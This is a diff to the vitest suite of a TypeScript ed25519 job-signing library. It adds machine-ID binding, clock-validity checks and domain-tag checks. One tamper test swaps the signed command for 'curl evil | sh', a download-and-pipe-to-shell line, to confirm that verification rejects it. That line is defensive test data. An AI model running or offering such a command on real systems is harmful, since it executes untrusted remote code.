@@ -1,4 +1,4 @@
-import { generateKeyPairSync } from "node:crypto";
+import { generateKeyPairSync, sign } from "node:crypto";
 import { describe, expect, it } from "vitest";
 import { canonicalJson, signJob, verifyJob, type JobSpec, type SignedJob } from "../src";
 
@@ -11,6 +11,7 @@ const spec: JobSpec = {
   model: "m1",
   command: "pnpm test",
 };
+const M = "machine-a";
 const NOW = 1_800_000_000_000;
 const keys = generateKeyPairSync("ed25519");
 const other = generateKeyPairSync("ed25519");
@@ -30,10 +31,10 @@ describe("canonicalJson", () => {
 });
 
 describe("signJob/verifyJob", () => {
-  const job = signJob(spec, "user-1", keys.privateKey, NOW);
+  const job = signJob(spec, "user-1", M, keys.privateKey, NOW);
 
   it("verifies a signed job", () => {
-    expect(verifyJob(job, keys.publicKey, NOW + 1000)).toEqual({ spec, userId: "user-1" });
+    expect(verifyJob(job, keys.publicKey, M, NOW + 1000)).toEqual({ spec, userId: "user-1", machineId: M });
   });
 
   it("signature is base64url", () => {
@@ -44,9 +45,9 @@ describe("signJob/verifyJob", () => {
   it("is independent of spec key order", () => {
     const reordered = Object.fromEntries(Object.entries(spec).reverse()) as JobSpec;
     expect(Object.keys(reordered)[0]).toBe("command");
-    const j2 = signJob(reordered, "user-1", keys.privateKey, NOW);
+    const j2 = signJob(reordered, "user-1", M, keys.privateKey, NOW);
     expect(j2.signature).toBe(job.signature);
-    expect(verifyJob({ ...job, spec: reordered }, keys.publicKey, NOW)).toBeTruthy();
+    expect(verifyJob({ ...job, spec: reordered }, keys.publicKey, M, NOW)).toBeTruthy();
   });
 
   const tampers: Array<[string, (j: SignedJob) => SignedJob]> = [
@@ -58,22 +59,23 @@ describe("signJob/verifyJob", () => {
     ["model", (j) => ({ ...j, spec: { ...j.spec, model: "m2" } })],
     ["command", (j) => ({ ...j, spec: { ...j.spec, command: "curl evil | sh" } })],
     ["removed command", (j) => ({ ...j, spec: { ...j.spec, command: undefined } })],
+    ["machineId", (j) => ({ ...j, machineId: "machine-b" })],
     ["userId", (j) => ({ ...j, userId: "user-2" })],
     ["issuedAt", (j) => ({ ...j, issuedAt: j.issuedAt + 1 })],
   ];
   for (const [name, fn] of tampers) {
     it(`rejects tampered ${name}`, () => {
-      expect(() => verifyJob(fn(job), keys.publicKey, NOW)).toThrow();
+      expect(() => verifyJob(fn(job), keys.publicKey, M, NOW)).toThrow();
     });
   }
 
   it("rejects an added unsigned spec field", () => {
     const bad = { ...job, spec: { ...job.spec, extra: "x" } } as unknown as SignedJob;
-    expect(() => verifyJob(bad, keys.publicKey, NOW)).toThrow();
+    expect(() => verifyJob(bad, keys.publicKey, M, NOW)).toThrow();
   });
 
   it("rejects the wrong key", () => {
-    expect(() => verifyJob(job, other.publicKey, NOW)).toThrow();
+    expect(() => verifyJob(job, other.publicKey, M, NOW)).toThrow();
   });
 
   it("rejects malformed signature encodings", () => {
@@ -87,34 +89,66 @@ describe("signJob/verifyJob", () => {
       job.signature.replace(/.$/, "+"),
     ];
     for (const signature of bad) {
-      expect(() => verifyJob({ ...job, signature }, keys.publicKey, NOW)).toThrow();
+      expect(() => verifyJob({ ...job, signature }, keys.publicKey, M, NOW)).toThrow();
     }
     expect(() =>
-      verifyJob({ ...job, signature: 5 } as unknown as SignedJob, keys.publicKey, NOW),
+      verifyJob({ ...job, signature: 5 } as unknown as SignedJob, keys.publicKey, M, NOW),
     ).toThrow();
   });
 
   it("rejects a non-ed25519 public key", () => {
     const rsa = generateKeyPairSync("rsa", { modulusLength: 2048 });
-    expect(() => verifyJob(job, rsa.publicKey, NOW)).toThrow();
+    expect(() => verifyJob(job, rsa.publicKey, M, NOW)).toThrow();
   });
 
   it("rejects a job issued 6 minutes ago but accepts 4 minutes", () => {
-    expect(() => verifyJob(job, keys.publicKey, NOW + 6 * 60_000)).toThrow(/expired/);
-    expect(verifyJob(job, keys.publicKey, NOW + 4 * 60_000).userId).toBe("user-1");
+    expect(() => verifyJob(job, keys.publicKey, M, NOW + 6 * 60_000)).toThrow(/expired/);
+    expect(verifyJob(job, keys.publicKey, M, NOW + 4 * 60_000).userId).toBe("user-1");
   });
 
   it("rejects issuedAt more than 60s in the future, accepts within", () => {
-    expect(() => verifyJob(job, keys.publicKey, NOW - 61_000)).toThrow(/future/);
-    expect(verifyJob(job, keys.publicKey, NOW - 59_000).userId).toBe("user-1");
+    expect(() => verifyJob(job, keys.publicKey, M, NOW - 61_000)).toThrow(/future/);
+    expect(verifyJob(job, keys.publicKey, M, NOW - 59_000).userId).toBe("user-1");
+  });
+
+  it("rejects a job signed for machine A on machine B", () => {
+    expect(() => verifyJob(job, keys.publicKey, "machine-b", NOW)).toThrow(/different machine/);
+  });
+
+  it("rejects an empty expectedMachineId", () => {
+    expect(() => verifyJob(job, keys.publicKey, "", NOW)).toThrow();
+  });
+
+  it("rejects a non-integer or non-finite clock", () => {
+    for (const bad of [NaN, Infinity, -Infinity, 1.5]) {
+      expect(() => verifyJob(job, keys.publicKey, M, bad)).toThrow(/invalid clock/);
+    }
+  });
+
+  it("covers the domain tag in the signature", () => {
+    const base = { machineId: M, spec, userId: "user-1", issuedAt: NOW };
+    const forge = (payload: object) =>
+      ({
+        ...job,
+        signature: sign(null, Buffer.from(canonicalJson(payload), "utf8"), keys.privateKey).toString(
+          "base64url",
+        ),
+      }) as SignedJob;
+    // Sanity: the correctly tagged payload verifies, so the negatives below are meaningful.
+    expect(
+      verifyJob(forge({ v: "hoistline-job-v1", ...base }), keys.publicKey, M, NOW).userId,
+    ).toBe("user-1");
+    expect(() => verifyJob(forge(base), keys.publicKey, M, NOW)).toThrow();
+    expect(() => verifyJob(forge({ v: "other", ...base }), keys.publicKey, M, NOW)).toThrow();
   });
 
   it("rejects invalid specs at sign time", () => {
-    expect(() => signJob({ ...spec, repo: "" }, "u", keys.privateKey, NOW)).toThrow();
+    expect(() => signJob({ ...spec, model: "" }, "u", M, keys.privateKey, NOW)).toThrow();
+    expect(() => signJob({ ...spec, repo: "" }, "u", M, keys.privateKey, NOW)).toThrow();
   });
 
   it("rejects garbage input", () => {
-    expect(() => verifyJob(null as unknown as SignedJob, keys.publicKey, NOW)).toThrow();
-    expect(() => verifyJob({} as SignedJob, keys.publicKey, NOW)).toThrow();
+    expect(() => verifyJob(null as unknown as SignedJob, keys.publicKey, M, NOW)).toThrow();
+    expect(() => verifyJob({} as SignedJob, keys.publicKey, M, NOW)).toThrow();
   });
 });
